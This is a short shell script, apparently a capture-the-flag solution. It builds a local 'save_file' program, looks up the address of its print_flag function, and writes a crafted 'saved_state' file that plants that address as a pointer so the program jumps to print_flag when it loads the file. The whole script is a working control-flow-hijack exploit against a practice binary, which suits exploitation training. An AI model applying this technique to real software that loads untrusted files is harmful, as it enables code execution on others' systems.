#!/bin/sh
BIN="./save_file"
gcc -masm=intel -g -o $BIN "${BIN}.c" || exit
# objdump -d $BIN > "${BIN}.att.S"
objdump -Mintel -d $BIN > "${BIN}.S"
nm $BIN > "${BIN}.syms"

# readelf -s $BIN > "${BIN}.sections"
# objdump -Mintel -s -d $BIN > "${BIN}.all.S"
# objdump -Mintel -s -j .init_array -d $BIN > "${BIN}.init_array.S"

# echo "% ${BIN}"
# "${BIN}"

print_flag_addr() {
    grep print_flag save_file.syms | cut -d" " -f1 | python -c "from sys import *; from struct import *; offset = int(stdin.read().strip(), 16); print(str(pack('<Q', offset)).replace('b', '').replace('\'', ''))"
}

echo "% grep print_flag save_file.syms"
grep print_flag save_file.syms

ADDR=$(print_flag_addr)
echo -ne "\x03\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" > saved_state
echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00${ADDR}" >> saved_state

echo "% xxd saved_state"
xxd saved_state

echo "% ${BIN}"
"${BIN}"

if [ -f .[0-9]* ]; then
    rm .[0-9]*
fi